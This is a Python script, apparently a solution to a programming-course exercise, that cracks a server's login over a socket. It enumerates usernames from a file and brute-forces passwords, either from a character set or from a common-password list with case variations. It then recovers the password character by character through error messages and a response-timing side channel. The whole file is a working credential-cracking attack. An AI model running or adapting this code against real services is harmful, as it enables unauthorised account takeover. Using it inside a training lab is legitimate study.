# write your code here
import sys
import socket
import string
import json
from datetime import datetime, timedelta

import itertools

# TODO: argparse instead? plus, procesing of the user input and
# TODO: add logging for debug
# TODO: add exceptions handling
# 2 inputs accepted: server address and port to connect
HOST = sys.argv[1]
PORT = int(sys.argv[2])

# generate two lists lat-lower+numbers and lat_upper+lat_lower+numbers
lowercase_lat_symbols = list(string.ascii_lowercase)
uppercase_lat_symbols = list(string.ascii_uppercase)
arabic_numbers = [str(i) for i in range(0, 10)]

all_symbols = lowercase_lat_symbols + arabic_numbers
all_symb_w_upper = all_symbols + uppercase_lat_symbols

# json request template
request = {"login": "", "password": ""}


# generate pwd of diff length out of the list of symbols
def generate_passwords():
    # positions / length of the pwd: infinite counter starting with 1
    possible_length = itertools.count(start=1, step=1)
    while True:
        for length in possible_length:
            # generate combinations
            for pwd in itertools.product(all_symbols, repeat=length):
                password = ''.join(pwd)
                yield password


# the file with most common passowrd
def read_passwords():
    with open('passwords.txt', 'r') as file:
        yield from file


# the file with most common logins
def read_logins():
    with open('logins.txt', 'r') as file:
        yield from file


# adding upper casses possibility in a pwd: read from file with password and try diff capitalization
def cases():
    for line in read_passwords():
        line = line.strip()
        if line.isdigit():
            yield line
        else:
            for variant in [''.join(x) for x in itertools.product(*zip(line.upper(), line.lower()))]:
                yield variant


# open client socket
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))

    # send and receive plane formatted msg
    def send_receive_password_plane(password):
        s.send(bytes(password, encoding='utf-8'))
        data = s.recv(1024).decode(encoding='utf-8')
        if data == "Connection success!":
            return True
        elif data == "Wrong password!":
            return False

    # send and receive json formatted msg with measuring the time of response receiving
    def json_send_receive(password):
        s.send(bytes(password, encoding='utf-8'))
        start = datetime.now()
        data = s.recv(1024).decode(encoding='utf-8')
        finish = datetime.now()
        difference = finish - start
        answer = json.loads(data)
        return answer["result"], difference

    # initiate iterations though pwd generator and verify the response of the server
    # use either generate_passwords() or cases() func to init generators depending on the use case
    def hack():
        # passwords = generate_passwords()
        passwords = cases()
        for password in passwords:
            if send_receive_password_plane(password):
                break
        return password

    # find righ login from teh provided file
    def find_login():
        for line in read_logins():
            line = line.strip()
            request["login"] = line
            result_msg, diff = json_send_receive(json.dumps(request))
            if result_msg == "Wrong password!" or result_msg == "Exception happened during login":
                break

    # find right pwd from the provided file
    def find_password(stroka):
        for symb in all_symb_w_upper:
            stroka_new = stroka + symb
            request["password"] = stroka_new
            result_msg, diff = json_send_receive(json.dumps(request))
            if result_msg == "Wrong password!":
                continue
            elif result_msg == "Exception happened during login":  # append to the string a new symbol
                return find_password(stroka_new)
            elif result_msg == "Connection success!":
                break

    # in case of finding vulnerability(to long responce if one the letters was right in the attempted pwd)
    def find_password_time_response(stroka):
        starting = timedelta(microseconds=0)
        for symb in all_symb_w_upper:
            stroka_new = stroka + symb
            request["password"] = stroka_new
            result_msg, diff = json_send_receive(json.dumps(request))
            if result_msg == "Connection success!":
                return stroka_new
            elif diff > starting:
                starting = diff
                string_to_remember = stroka_new
        return find_password_time_response(string_to_remember)


# launch the set of the functions depending on teh scenario tested:
    # generate pws from set of symbols, generate password from teh file
    find_login()
    empty_str = ''
    find_password_time_response(empty_str)

    print(json.dumps(request))

